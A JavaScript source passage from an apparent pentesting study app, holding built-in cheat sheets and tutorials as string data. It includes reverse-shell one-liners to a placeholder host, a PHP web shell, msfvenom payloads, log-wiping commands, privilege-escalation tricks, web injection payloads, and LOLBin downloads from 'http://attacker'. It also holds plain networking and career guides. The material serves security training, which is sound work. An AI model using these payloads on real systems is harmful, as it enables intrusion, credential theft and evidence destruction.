echo "" > ~/.bash_history && history -c
# Remove temp files
rm -rf /tmp/linpeas* /tmp/pspy* /dev/shm/*`,createdAt:Date.now()},
  {id:'ds6',title:'Reverse Shell One-Liners',cat:'tools',content:`[CATCH THE SHELL FIRST]
rlwrap nc -lvnp 4444                             # Start listener (with arrow keys)
nc -lvnp 4444                                    # Basic listener

[BASH]
bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'
bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1' &   # Background

[PYTHON3]
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<LHOST>",4444));[os.dup2(s.fileno(),i) for i in range(3)];subprocess.call(["/bin/sh"])'

[NETCAT — MKFIFO]
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <LHOST> 4444 >/tmp/f

[PHP (Web Shell)]
php -r '$sock=fsockopen("<LHOST>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
<?php system($_GET['cmd']); ?>                   # Simple web shell

[POWERSHELL]
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<LHOST>',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r+='> ';$x=([text.encoding]::ASCII).GetBytes($r);$s.Write($x,0,$x.Length)}"

[STABILISE SHELL — ALWAYS DO THIS]
python3 -c 'import pty;pty.spawn("/bin/bash")'  # Step 1: spawn TTY
# Press Ctrl+Z to background
stty raw -echo; fg                               # Step 2: fix terminal
export TERM=xterm; stty rows 38 columns 116      # Step 3: set size

[MSFVENOM PAYLOADS]
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell.exe
msfvenom -p php/reverse_php LHOST=<IP> LPORT=4444 -f raw -o shell.php`,createdAt:Date.now()},
];

const DEFAULT_BLOGS=[
  {id:'d1',title:'Networking Fundamentals: The OSI Model',cat:'networking',desc:'Understanding the 7 layers of the OSI model and how data travels across networks.',tags:['osi','tcp/ip','layers','fundamentals'],
  body:`<h2>The OSI Model — 7 Layers Explained</h2>
<p>The OSI (Open Systems Interconnection) model is a conceptual framework that describes how data moves through a network. Understanding it is critical for penetration testing because it helps you identify where vulnerabilities exist.</p>

<h3>Layer 7 — Application</h3>
<p>This is where users interact with the network. Protocols: <code>HTTP</code>, <code>HTTPS</code>, <code>FTP</code>, <code>SMTP</code>, <code>DNS</code>. Attack surface: web app vulnerabilities, API abuse, DNS poisoning.</p>

<h3>Layer 6 — Presentation</h3>
<p>Handles data encryption, compression, and translation. Think SSL/TLS. Attack surface: SSL stripping, cipher downgrade attacks.</p>

<h3>Layer 5 — Session</h3>
<p>Manages sessions between applications. Protocols: NetBIOS, RPC. Attack surface: session hijacking, token replay.</p>

<h3>Layer 4 — Transport</h3>
<p><code>TCP</code> (reliable, connection-oriented) vs <code>UDP</code> (fast, connectionless). Key concepts:</p>
<ul>
<li><strong>TCP 3-way handshake:</strong> SYN → SYN-ACK → ACK</li>
<li><strong>Port ranges:</strong> 0-1023 (well-known), 1024-49151 (registered), 49152-65535 (dynamic)</li>
<li><strong>Attack surface:</strong> SYN floods, port scanning, TCP reset attacks</li>
</ul>

<h3>Layer 3 — Network</h3>
<p>Routing and logical addressing (IP). Protocols: <code>IP</code>, <code>ICMP</code>, <code>ARP</code>. Attack surface: IP spoofing, ICMP redirect, ARP poisoning, route manipulation.</p>

<h3>Layer 2 — Data Link</h3>
<p>MAC addressing and frame delivery. Attack surface: MAC flooding, VLAN hopping, ARP spoofing, STP manipulation.</p>

<h3>Layer 1 — Physical</h3>
<p>The actual hardware — cables, switches, radio signals. Attack surface: physical access, wiretapping, jamming.</p>

<blockquote>Pro tip: When pentesting, always think about which OSI layer your attack targets. This helps you understand the scope and potential impact.</blockquote>

<h2>Key Ports to Memorize</h2>
<pre><code>21    FTP          File Transfer
22    SSH          Secure Shell
23    Telnet       Unencrypted remote access
25    SMTP         Email sending
53    DNS          Domain resolution
80    HTTP         Web traffic
110   POP3         Email retrieval
139   NetBIOS      Windows networking
143   IMAP         Email retrieval
443   HTTPS        Encrypted web traffic
445   SMB          File sharing (Windows)
3306  MySQL        Database
3389  RDP          Remote Desktop
5985  WinRM        Windows Remote Management</code></pre>`},

  {id:'d2',title:'Penetration Testing Methodology',cat:'pentesting',desc:'The complete penetration testing lifecycle from reconnaissance to reporting.',tags:['methodology','pentest','killchain','phases'],
  body:`<h2>The Penetration Testing Kill Chain</h2>
<p>Every professional pentest follows a structured methodology. Understanding this framework is essential for both offensive and defensive security.</p>

<h3>Phase 1: Reconnaissance (Information Gathering)</h3>
<p>Gather as much information as possible <strong>before</strong> touching the target.</p>
<ul>
<li><strong>Passive recon:</strong> OSINT, Google dorking, Shodan, social media, DNS records, WHOIS</li>
<li><strong>Active recon:</strong> Port scanning, service enumeration, banner grabbing</li>
</ul>
<pre><code># Example: Full TCP scan with service detection
nmap -sV -sC -p- -T4 --min-rate 5000 10.10.11.227 -oN scan.txt

# Subdomain enumeration
subfinder -d target.com -o subs.txt
ffuf -w subs.txt -u http://FUZZ.target.com -mc 200,301,302</code></pre>

<h3>Phase 2: Enumeration</h3>
<p>Deep-dive into discovered services. This is where most pentesters spend their time.</p>
<ul>
<li>Web: directory fuzzing, vhost discovery, tech stack fingerprinting</li>
<li>SMB: shares, users, password policies</li>
<li>LDAP: domain users, groups, SPNs for Kerberoasting</li>
</ul>

<h3>Phase 3: Exploitation</h3>
<p>Gain initial access using discovered vulnerabilities.</p>
<ul>
<li>Web exploits: SQLi, XSS, SSRF, file upload, deserialization</li>
<li>Known CVEs: match exact versions from enumeration</li>
<li>Credential attacks: default creds, brute force, password spraying</li>
</ul>

<h3>Phase 4: Privilege Escalation</h3>
<p>Escalate from low-privilege user to root/SYSTEM.</p>
<pre><code># Linux quick wins
sudo -l                              # Check sudo permissions
find / -perm -4000 2>/dev/null       # Find SUID binaries
cat /etc/crontab                     # Check cron jobs
ls -la /home/*/.ssh/                 # Look for SSH keys

# Windows quick wins
whoami /priv                         # Check token privileges
reg query HKLM\\SOFTWARE\\Policies   # Check policies
cmdkey /list                         # Stored credentials</code></pre>

<h3>Phase 5: Post-Exploitation</h3>
<p>After getting root: dump credentials, pivot to other systems, document everything.</p>

<blockquote>The methodology is iterative — findings in one phase often send you back to an earlier phase with new information.</blockquote>`},

  {id:'d3',title:'Linux Privilege Escalation Cheatsheet',cat:'privesc',desc:'Complete guide to escalating privileges on Linux systems.',tags:['linux','privesc','suid','sudo','cron'],
  body:`<h2>Linux Privilege Escalation</h2>
<p>After gaining a low-privilege shell, your goal is to escalate to root. Here are the most common vectors.</p>

<h3>1. Sudo Misconfigurations</h3>
<pre><code>sudo -l    # Always start here!

# If you see NOPASSWD entries, check GTFOBins:
# https://gtfobins.github.io/
# Example: sudo vim -c ':!sh'
# Example: sudo python3 -c 'import os; os.system("/bin/bash")'</code></pre>

<h3>2. SUID Binaries</h3>
<pre><code>find / -perm -4000 -type f 2>/dev/null

# Common exploitable SUID binaries:
# /usr/bin/find → find . -exec /bin/sh \\;
# /usr/bin/python3 → python3 -c 'import os;os.execl("/bin/sh","sh","-p")'
# /usr/bin/vim → vim -c ':py3 import os; os.execl("/bin/sh","sh","-p")'</code></pre>

<h3>3. Cron Jobs</h3>
<pre><code>cat /etc/crontab
ls -la /etc/cron.*
# Use pspy to monitor processes:
./pspy64

# Look for:
# - Scripts run as root that you can write to
# - Wildcard injection (tar, rsync)
# - PATH hijacking in cron scripts</code></pre>

<h3>4. Writable Files & PATH Hijack</h3>
<pre><code># Find world-writable files
find / -writable -type f 2>/dev/null

# If a root script calls a command without full path:
# Create your own version earlier in PATH
echo '/bin/bash' > /tmp/ps
chmod +x /tmp/ps
export PATH=/tmp:$PATH</code></pre>

<h3>5. Kernel Exploits</h3>
<pre><code>uname -a
cat /etc/os-release
# Search for kernel exploits:
searchsploit linux kernel [version]
# Use linux-exploit-suggester.sh</code></pre>

<h3>6. Capabilities</h3>
<pre><code>getcap -r / 2>/dev/null
# If python3 has cap_setuid:
python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'</code></pre>

<h3>7. Internal Services</h3>
<pre><code>ss -tnlp    # or netstat -tnlp
# Look for services on 127.0.0.1
# Port forward with: ssh -L 8080:127.0.0.1:8080 user@target
# Or use chisel for pivoting</code></pre>

<blockquote>Always run LinPEAS first — it catches 90% of these vectors automatically. But learn to do it manually so you understand WHY each vector works.</blockquote>`},

  {id:'d4',title:'Web Application Hacking Fundamentals',cat:'web',desc:'Essential web vulnerabilities every pentester must know — OWASP Top 10 and beyond.',tags:['owasp','sqli','xss','ssrf','web'],
  body:`<h2>Web Application Security</h2>
<p>Web apps are the most common attack surface in modern pentesting. Master these vulnerabilities.</p>

<h3>SQL Injection (SQLi)</h3>
<p>Inject SQL code through user input to read, modify, or delete database data.</p>
<pre><code># Detection
' OR 1=1-- -
' UNION SELECT NULL,NULL,NULL-- -
' AND SLEEP(5)-- -

# Exploitation with sqlmap
sqlmap -u "http://target/page?id=1" --dbs --batch
sqlmap -u "http://target/page?id=1" -D dbname --tables
sqlmap -u "http://target/page?id=1" -D dbname -T users --dump</code></pre>

<h3>Cross-Site Scripting (XSS)</h3>
<p>Inject JavaScript that executes in other users' browsers.</p>
<pre><code># Reflected XSS
&lt;script&gt;alert(document.cookie)&lt;/script&gt;
&lt;img src=x onerror=alert(1)&gt;

# Stored XSS — persists in the database
# DOM XSS — manipulates client-side JavaScript</code></pre>

<h3>Server-Side Request Forgery (SSRF)</h3>
<pre><code># Force the server to make requests to internal resources
http://target/fetch?url=http://127.0.0.1:8080/admin
http://target/fetch?url=http://169.254.169.254/latest/meta-data/  # AWS</code></pre>

<h3>Local/Remote File Inclusion (LFI/RFI)</h3>
<pre><code># LFI
http://target/page?file=../../../../etc/passwd
http://target/page?file=php://filter/convert.base64-encode/resource=config.php

# Log poisoning → LFI to RCE
# Poison /var/log/apache2/access.log with PHP in User-Agent</code></pre>

<h3>Insecure Deserialization</h3>
<p>Manipulate serialized objects to achieve RCE. Common in Java (ysoserial), PHP (unserialize), Python (pickle).</p>

<h3>Methodology for Web Testing</h3>
<ol>
<li>Map the application — all endpoints, parameters, forms</li>
<li>Identify the tech stack — headers, cookies, error pages</li>
<li>Test authentication — default creds, brute force, token analysis</li>
<li>Test authorization — IDOR, privilege escalation, forced browsing</li>
<li>Test input handling — SQLi, XSS, command injection in every param</li>
<li>Test file operations — upload, download, path traversal</li>
<li>Check for known CVEs — match exact CMS/framework versions</li>
</ol>

<blockquote>Use Burp Suite as your proxy for everything. Learn to love the Repeater tab — it's where most bugs are found.</blockquote>`},

  {id:'d5',title:'Red Team Operations & Tactics',cat:'redteam',desc:'Advanced red team techniques: C2, evasion, persistence, and lateral movement.',tags:['redteam','c2','evasion','persistence','lateral'],
  body:`<h2>Red Team Operations</h2>
<p>Red teaming goes beyond pentesting — it simulates real adversaries to test an organization's detection and response capabilities.</p>

<h3>Command & Control (C2)</h3>
<p>Establish reliable communication with compromised hosts.</p>
<ul>
<li><strong>Common C2 frameworks:</strong> Cobalt Strike, Sliver, Havoc, Mythic</li>
<li><strong>Communication channels:</strong> HTTPS, DNS, SMB named pipes, websockets</li>
<li><strong>Key concept:</strong> Use domain fronting or redirectors to hide C2 infrastructure</li>
</ul>

<h3>Initial Access Techniques</h3>
<ul>
<li>Phishing with macro-enabled documents or HTML smuggling</li>
<li>Exploiting public-facing applications</li>
<li>Supply chain compromise</li>
<li>Valid credentials from credential stuffing or OSINT</li>
</ul>

<h3>Defense Evasion</h3>
<pre><code># AMSI bypass concepts (for educational purposes)
# - Patching amsi.dll in memory
# - Using obfuscation tools
# - Living-off-the-land binaries (LOLBins)

# Common LOLBins:
certutil -urlcache -split -f http://attacker/payload.exe
mshta http://attacker/payload.hta
rundll32 javascript:"\\..\\mshtml,RunHTMLApplication"</code></pre>

<h3>Persistence Mechanisms</h3>
<ul>
<li><strong>Registry Run keys:</strong> HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</li>
<li><strong>Scheduled tasks:</strong> schtasks /create</li>
<li><strong>WMI event subscriptions</strong></li>
<li><strong>DLL hijacking</strong> in trusted application paths</li>
<li><strong>Golden/Silver tickets</strong> in Active Directory</li>
</ul>

<h3>Lateral Movement</h3>
<pre><code># Pass-the-Hash
crackmapexec smb 10.10.10.0/24 -u admin -H <ntlm_hash>
impacket-psexec admin@target -hashes :&lt;ntlm_hash&gt;

# Kerberoasting
impacket-GetUserSPNs domain/user:pass -dc-ip 10.10.10.1 -request

# Over-pass-the-hash / Pass-the-key
# Use Rubeus or impacket to request TGT with NTLM hash</code></pre>

<h3>Active Directory Attack Path</h3>
<ol>
<li>Enumerate with BloodHound — find shortest path to Domain Admin</li>
<li>Kerberoast service accounts for crackable hashes</li>
<li>AS-REP roast accounts with pre-auth disabled</li>
<li>Abuse delegation (constrained, unconstrained, RBCD)</li>
<li>DCSync to dump all domain hashes</li>
<li>Golden ticket for persistent domain access</li>
</ol>

<blockquote>Map the MITRE ATT&CK framework to your operations. It helps with planning, execution, and reporting.</blockquote>`},

  {id:'d6',title:'Windows Privilege Escalation Cheatsheet',cat:'privesc',desc:'Essential techniques for escalating privileges on Windows systems.',tags:['windows','privesc','tokens','services','registry'],
  body:`<h2>Windows Privilege Escalation</h2>

<h3>1. Token Privileges</h3>
<pre><code>whoami /priv

# SeImpersonatePrivilege → Potato attacks
# PrintSpoofer.exe -i -c cmd
# GodPotato.exe -cmd "cmd /c whoami"
# JuicyPotatoNG.exe -t * -p cmd.exe

# SeBackupPrivilege → Read any file
# SeRestorePrivilege → Write any file
# SeDebugPrivilege → Inject into processes</code></pre>

<h3>2. Unquoted Service Paths</h3>
<pre><code># Find unquoted paths:
wmic service get name,pathname,startmode | findstr /i /v "c:\\windows"

# If path is: C:\\Program Files\\My App\\service.exe
# Place malicious binary at: C:\\Program.exe or C:\\Program Files\\My.exe</code></pre>

<h3>3. Weak Service Permissions</h3>
<pre><code># Check service ACLs with accesschk:
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

# If you can modify a service:
sc config vuln_service binpath= "C:\\temp\\shell.exe"
sc stop vuln_service
sc start vuln_service</code></pre>

<h3>4. AlwaysInstallElevated</h3>
<pre><code>reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated

# If both return 1:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi</code></pre>

<h3>5. Stored Credentials</h3>
<pre><code>cmdkey /list                          # Saved credentials
dir /s /b C:\\Users\\*password* 2>nul  # Files with "password"
type C:\\Users\\*\\AppData\\*\\*history*  # Command history
reg query HKLM /f password /t REG_SZ /s  # Registry passwords</code></pre>

<h3>6. Automated Enumeration</h3>
<pre><code># Run WinPEAS for comprehensive check:
winpeas.exe quiet fast searchfast cmd

# PowerUp.ps1:
Import-Module .\\PowerUp.ps1
Invoke-AllChecks</code></pre>

<blockquote>Always check <code>whoami /priv</code> first — SeImpersonatePrivilege is an instant win on most Windows boxes.</blockquote>`},

  {id:'d4',title:'TCP/IP & Networking — A Complete Beginner\'s Guide',cat:'networking',
  desc:'Everything you need to know about TCP/IP, how the internet works, and why it matters for security — explained so simply a 10-year-old could understand.',
  tags:['tcp/ip','networking','fundamentals','beginner','protocols','dns','http'],
  body:`<h2>What Is a Network?</h2>
<p>Imagine you and your friend both have walkie-talkies. You can talk to each other directly. Now imagine a city where millions of walkie-talkies need to talk to each other. That's basically a network — a system that allows computers to send information to each other.</p>
<p>The internet is the world's biggest network. It connects billions of devices — phones, computers, servers — using a common language called <strong>TCP/IP</strong>.</p>

<h2>IP Addresses — The Postal Address of the Internet</h2>
<p>Every device on a network has an <strong>IP address</strong> (Internet Protocol address). Think of it like a home address. When you send a letter, you write the recipient's address on it. When your computer sends data, it writes the destination IP address.</p>
<pre><code>IPv4 example:  192.168.1.100     (4 numbers, 0-255, separated by dots)
IPv6 example:  2001:0db8:85a3::8a2e:0370:7334  (newer, 128-bit)

Private IP ranges (your home/office network):
  10.0.0.0   - 10.255.255.255      (Class A)
  172.16.0.0 - 172.31.255.255      (Class B)
  192.168.0.0- 192.168.255.255     (Class C, most home routers)

Public IPs: Everything else — routable on the internet</code></pre>

<h2>Ports — Which Door to Knock On</h2>
<p>An IP address gets you to the right house (computer), but a <strong>port number</strong> gets you to the right door (service). Think of it like an apartment building — the address gets you to the building, the apartment number gets you to the right person.</p>
<pre><code>Port 22    SSH        — Secure remote shell
Port 23    Telnet     — Insecure remote shell (plain text!)
Port 25    SMTP       — Sending email
Port 53    DNS        — Domain name lookups
Port 80    HTTP       — Web pages (unencrypted)
Port 110   POP3       — Receiving email
Port 143   IMAP       — Email access
Port 443   HTTPS      — Secure web pages
Port 445   SMB        — Windows file sharing
Port 3306  MySQL      — Database
Port 3389  RDP        — Remote Desktop (Windows)
Port 8080  HTTP-alt   — Alternative web port</code></pre>
<blockquote>Security tip: If you see unusual ports open on a machine, that's interesting! Unusual ports often mean custom services or backdoors.</blockquote>

<h2>The OSI Model — 7 Layers of Networking</h2>
<p>The OSI model is like a recipe that explains all the steps data goes through when it travels from one computer to another. There are 7 layers. Each layer has a specific job.</p>
<p>Memory trick: <strong>"Please Do Not Throw Sausage Pizza Away"</strong> (Physical, Data Link, Network, Transport, Session, Presentation, Application)</p>
<pre><code>Layer 7 — APPLICATION   → What the user sees (HTTP, FTP, DNS, SSH)
Layer 6 — PRESENTATION  → Encryption, compression (SSL/TLS)
Layer 5 — SESSION       → Opening/closing connections (NetBIOS, RPC)
Layer 4 — TRANSPORT     → TCP/UDP — reliable vs fast delivery
Layer 3 — NETWORK       → IP addresses, routing (IP, ICMP, ARP)
Layer 2 — DATA LINK     → MAC addresses, frames (Ethernet, Wi-Fi)
Layer 1 — PHYSICAL      → Cables, radio waves, actual hardware</code></pre>

<h2>TCP vs UDP — Two Ways to Send Data</h2>
<p>Imagine you need to send a very important document to a friend. You have two choices:</p>
<ul>
<li><strong>Registered mail (TCP)</strong> — You send it, they confirm receipt. If it gets lost, it's resent. Reliable but slower.</li>
<li><strong>Shouting across a field (UDP)</strong> — You shout it, you don't know if they heard. Fast but unreliable.</li>
</ul>
<pre><code>TCP (Transmission Control Protocol):
  ✓ Guaranteed delivery (acknowledgements)
  ✓ Data arrives in order
  ✓ Error checking
  ✗ Slower due to overhead
  Used for: HTTP, HTTPS, SSH, FTP, email

UDP (User Datagram Protocol):
  ✓ Very fast, low overhead
  ✓ Good for real-time data
  ✗ No guarantee of delivery
  ✗ No order guarantee
  Used for: DNS, VoIP, video streaming, gaming, SNMP</code></pre>

<h2>The TCP 3-Way Handshake — How Connections Are Made</h2>
<p>Before your browser loads a webpage, it first "shakes hands" with the server to agree to communicate. This is the TCP 3-way handshake:</p>
<pre><code>Step 1 — SYN:      Your computer says "Hey, can we talk?"
Step 2 — SYN-ACK:  Server says "Yes! I hear you, can you hear me?"
Step 3 — ACK:      Your computer says "Yes! Let's go."

[ YOUR PC ]  →  SYN          →  [ SERVER ]
[ YOUR PC ]  ←  SYN-ACK      ←  [ SERVER ]
[ YOUR PC ]  →  ACK           →  [ SERVER ]
         ← Connection established →

Security note: SYN floods exploit this — send thousands of SYN
packets without completing the handshake → server runs out of memory.</code></pre>

<h2>DNS — The Internet's Phone Book</h2>
<p>When you type <code>google.com</code> in your browser, your computer has no idea what IP address that is. It needs to look it up — that's what <strong>DNS</strong> (Domain Name System) does. It translates human-friendly names to IP addresses.</p>
<pre><code>DNS Lookup Process:
1. You type: google.com
2. Your computer asks your router: "What's google.com's IP?"
3. Router asks your ISP's DNS server
4. If not cached, it asks a Root DNS server
5. Root says: "Ask the .com server"
6. .com server says: "Ask Google's nameserver"
7. Google's nameserver says: "It's 142.250.80.46"
8. Your computer connects to 142.250.80.46

Common DNS Record Types:
  A      → Domain maps to IPv4 address
  AAAA   → Domain maps to IPv6 address
  MX     → Mail server for the domain
  CNAME  → Alias (points to another domain)
  TXT    → Text records (SPF, DKIM, verification)
  NS     → Nameserver for the domain

Security: DNS runs on port 53. DNS poisoning = feeding false
records to a DNS server so users go to the wrong IP.</code></pre>

<h2>HTTP & HTTPS — How Websites Work</h2>
<p>HTTP (HyperText Transfer Protocol) is the language browsers and web servers speak to each other. When you visit a website, your browser sends an <strong>HTTP request</strong> and the server sends back an <strong>HTTP response</strong>.</p>
<pre><code>HTTP Request example:
  GET /index.html HTTP/1.1
  Host: example.com
  User-Agent: Mozilla/5.0
  Cookie: session=abc123

HTTP Response:
  HTTP/1.1 200 OK
  Content-Type: text/html
  Content-Length: 1234
  &lt;!DOCTYPE html&gt;...

HTTP Methods:
  GET     → Retrieve data (loading a page)
  POST    → Send data (submitting a form)
  PUT     → Update a resource
  DELETE  → Delete a resource
  HEAD    → Get headers only

Status Codes:
  200 OK           → Success
  301/302          → Redirect
  400 Bad Request  → You sent something wrong
  401 Unauthorized → Need to log in
  403 Forbidden    → You don't have permission
  404 Not Found    → Page doesn't exist
  500 Server Error → The server broke</code></pre>
<p><strong>HTTPS</strong> is HTTP but encrypted with TLS (Transport Layer Security). Everything is scrambled so nobody can read your data in transit. Look for the padlock icon in your browser.</p>
<blockquote>Security: HTTP sends passwords in PLAIN TEXT over the network. Always use HTTPS. In a pentest, sniffing HTTP traffic is trivial with Wireshark.</blockquote>

<h2>Subnetting — Dividing Networks</h2>
<p>A subnet is a smaller network inside a bigger network. Your home router creates a subnet (usually 192.168.0.0/24). The <code>/24</code> is called CIDR notation.</p>
<pre><code>CIDR Notation:
  192.168.1.0/24   → 254 usable hosts (/24 = 255.255.255.0)
  192.168.1.0/16   → 65534 usable hosts (/16 = 255.255.0.0)
  192.168.1.0/8    → 16M usable hosts (/8 = 255.0.0.0)
  10.0.0.1/30      → 2 usable hosts (point-to-point links)

Rule of thumb:
  /24 = small office or home network
  /16 = medium corporate network
  /8  = large enterprise (class A)

Broadcast address: always the last IP in range
  192.168.1.0/24 → broadcast is 192.168.1.255

Gateway (router): usually the first usable IP
  192.168.1.0/24 → gateway often at 192.168.1.1</code></pre>

<h2>MAC Addresses — Hardware Identity</h2>
<p>Every network card has a burned-in <strong>MAC address</strong> (Media Access Control). It's a unique hardware identifier — like a serial number for your network card. MAC addresses work at Layer 2 (Data Link) and only matter on local networks.</p>
<pre><code>Format: XX:XX:XX:XX:XX:XX  (6 bytes in hex)
Example: 00:1A:2B:3C:4D:5E

First 3 bytes = OUI (manufacturer ID)
  00:1A:2B = Intel Corp
  F8:FF:C2 = Apple Inc

ARP (Address Resolution Protocol):
  "Who has IP 192.168.1.100? Tell 192.168.1.1"
  → Maps IP addresses to MAC addresses on local network

Security: ARP spoofing = sending fake ARP replies to
  poison ARP tables → man-in-the-middle attack on LAN</code></pre>

<h2>Firewalls — The Gatekeepers</h2>
<p>A firewall is like a security guard at the door of your network. It checks every packet that comes in or goes out and decides whether to allow or block it based on rules.</p>
<pre><code>Firewall types:
  Packet filter  → Checks IP/port (iptables, Windows Firewall)
  Stateful       → Tracks connection state (most modern firewalls)
  Application    → Understands protocols (Layer 7, WAF)
  Next-gen (NGFW)→ DPI, IDS/IPS, app awareness

Common iptables rules:
  iptables -L                     # List rules
  iptables -A INPUT -p tcp --dport 22 -j ACCEPT   # Allow SSH
  iptables -A INPUT -j DROP       # Drop everything else

For pentesting: nmap can identify firewall rules
  nmap -sA <IP>   # ACK scan to detect filtering</code></pre>

<h2>Key Protocols Summary Table</h2>
<pre><code>Protocol  Port    Layer  Description
────────  ──────  ─────  ──────────────────────────────────────
SSH       22      7      Encrypted remote access
Telnet    23      7      Unencrypted remote access (INSECURE)
SMTP      25      7      Email sending
DNS       53      7      Domain name resolution (TCP+UDP)
HTTP      80      7      Web traffic (unencrypted)
HTTPS     443     7      Web traffic (TLS encrypted)
SMB       445     7      Windows file/printer sharing
RDP       3389    7      Windows Remote Desktop
FTP       21/20   7      File Transfer (21=control, 20=data)
ICMP      —       3      Ping, traceroute (no port number)
ARP       —       2      IP-to-MAC resolution (local only)
TCP       —       4      Reliable stream protocol
UDP       —       4      Fast unreliable datagram protocol</code></pre>
<blockquote>This is your foundation. Every CTF, every pentest, every bug bounty — it all comes back to these fundamentals. Know them cold.</blockquote>`},

  {id:'d5',title:'Starting a New Cyber Security Job — What to Expect',cat:'general',
  desc:'A practical guide on what to expect when you start a security role — from your first week to settling in, knowing the tools, and being taken seriously.',
  tags:['career','job','soc','pentest','first-job','advice'],
  body:`<h2>Congratulations — You Got the Job</h2>
<p>Starting a new cybersecurity role is exciting but also overwhelming. Whether it's a SOC analyst position, a penetration tester role, or a junior security engineer job, the first few weeks will feel like drinking from a firehose. This guide will help you hit the ground running.</p>

<h2>The First Week — Don't Try to Be a Hero</h2>
<p>Your first week is about <strong>observation and listening</strong>. Don't try to immediately fix everything or show off. Your job is to understand:</p>
<ul>
<li>How the team works and communicates</li>
<li>What tools are in use (SIEM, ticketing system, EDR)</li>
<li>Who the key stakeholders are</li>
<li>What the most common threats or issues look like</li>
<li>Where documentation lives</li>
</ul>
<blockquote>Rule #1: Never make a change in a production environment without approval. Even small changes can cascade into major incidents. Ask first, act second.</blockquote>

<h2>Tools You Will Likely Encounter</h2>
<pre><code>SOC / Blue Team:
  SIEM           → Splunk, Microsoft Sentinel, IBM QRadar
  EDR            → CrowdStrike Falcon, SentinelOne, Microsoft Defender
  Threat Intel   → VirusTotal, MISP, Threat Intelligence Platform
  Ticketing      → ServiceNow, Jira, TheHive
  Network        → Wireshark, Zeek/Bro, Suricata

Penetration Testing / Red Team:
  Scanning       → nmap, masscan, Shodan
  Web testing    → Burp Suite Pro, OWASP ZAP
  Exploitation   → Metasploit Framework
  C2 Framework   → Cobalt Strike, Havoc, Sliver
  Password       → Hashcat, John the Ripper, CrackStation
  Active Dir     → BloodHound, Impacket, Responder

Both Teams:
  Scripting      → Python, Bash, PowerShell
  Virtualization → VMware/VirtualBox for isolated labs
  Note-taking    → Obsidian, CherryTree, this tool!</code></pre>

<h2>Understanding the Alert Triage Process (SOC)</h2>
<p>If you're in a SOC, most of your day will involve <strong>triaging alerts</strong>. Here's the typical process:</p>
<pre><code>1. Alert comes in (from SIEM, EDR, IDS)
2. Review the alert: What triggered it? What asset? What time?
3. Gather context: Look up the IP, domain, hash in threat intel
4. Determine severity: Is this a true positive or false positive?
5. If real: Escalate, contain, investigate
6. Document everything in the ticket
7. Close with notes on what was found and done</code></pre>

<h2>The Pentest Engagement Process</h2>
<p>If you're doing penetration testing, every engagement follows roughly this structure:</p>
<pre><code>Phase 1 — Pre-Engagement (paperwork!)
  - Scope of work defined (what IPs/domains can be tested)
  - Rules of engagement (no DoS, no social engineering, etc.)
  - Statement of work / contract signed
  - Emergency contacts established

Phase 2 — Reconnaissance
  - Passive: OSINT, Shodan, certificate transparency
  - Active: nmap, web enum, service fingerprinting

Phase 3 — Vulnerability Assessment
  - Identify potential vulnerabilities
  - Don't exploit yet — just map the attack surface

Phase 4 — Exploitation
  - Carefully exploit within scope
  - Document every step with screenshots
  - Avoid causing service disruption

Phase 5 — Post-Exploitation
  - Demonstrate impact: what data could an attacker reach?
  - Lateral movement only if in scope

Phase 6 — Reporting
  - Executive summary (for management, non-technical)
  - Technical details (for IT team)
  - Recommendations with severity ratings (CVSS)
  - Proof of concept for each finding</code></pre>

<h2>Key Frameworks to Know</h2>
<pre><code>MITRE ATT&CK:
  A knowledge base of real-world attacker tactics and techniques.
  Used to describe how attackers operate at each phase.
  → https://attack.mitre.org

OWASP Top 10:
  The 10 most common web application vulnerabilities.
  Essential reading for web security roles.
  → https://owasp.org/Top10

NIST Cybersecurity Framework:
  Identify → Protect → Detect → Respond → Recover
  Used by organizations to structure their security programs.

CVE / CVSS:
  CVE = Common Vulnerabilities and Exposures (unique ID per bug)
  CVSS = Common Vulnerability Scoring System (severity 0-10)
  CVSS 9.0-10.0 = Critical — fix immediately</code></pre>

<h2>Professional Tips That Will Make You Stand Out</h2>
<ul>
<li><strong>Document everything.</strong> Screenshots, commands, output. Future you will thank present you.</li>
<li><strong>Learn to write clearly.</strong> Technical findings are useless if nobody understands the report.</li>
<li><strong>Build a home lab.</strong> HTB, TryHackMe, and your own VMs are how you stay sharp.</li>
<li><strong>Stay curious.</strong> Read security blogs, follow CVE news, understand the "why" behind each attack.</li>
<li><strong>Never stop learning.</strong> The field changes constantly. What's relevant today may be obsolete tomorrow.</li>
<li><strong>Own your mistakes.</strong> If you break something, be honest immediately. Coverups are always worse.</li>
</ul>
<blockquote>The best security professionals are the ones who keep asking questions. The moment you think you know everything is the moment you become the weakest link in the chain.</blockquote>`},
];

let studyBlogs=[];let studyCat='all';let readingBlogId=null;
let studySection='sheets';
let sheets=[];let sheetCat='all';
let writeups=[];let readingWriteupId=null;

function loadBlogs(){
  try{studyBlogs=JSON.parse(localStorage.getItem(K+'_blogs')||'[]')}catch{studyBlogs=[]}
  for(const db of DEFAULT_BLOGS){
    if(!studyBlogs.find(b=>b.id===db.id)){
      studyBlogs.push({...db,isDefault:true,createdAt:Date.now()});
    }
  }
  saveBlogs();
}
const saveBlogs=()=>localStorage.setItem(K+'_blogs',JSON.stringify(studyBlogs));
function loadSheets(){
  try{sheets=JSON.parse(localStorage.getItem(K+'_sheets')||'[]')}catch{sheets=[]}
  for(const ds of DEFAULT_SHEETS){
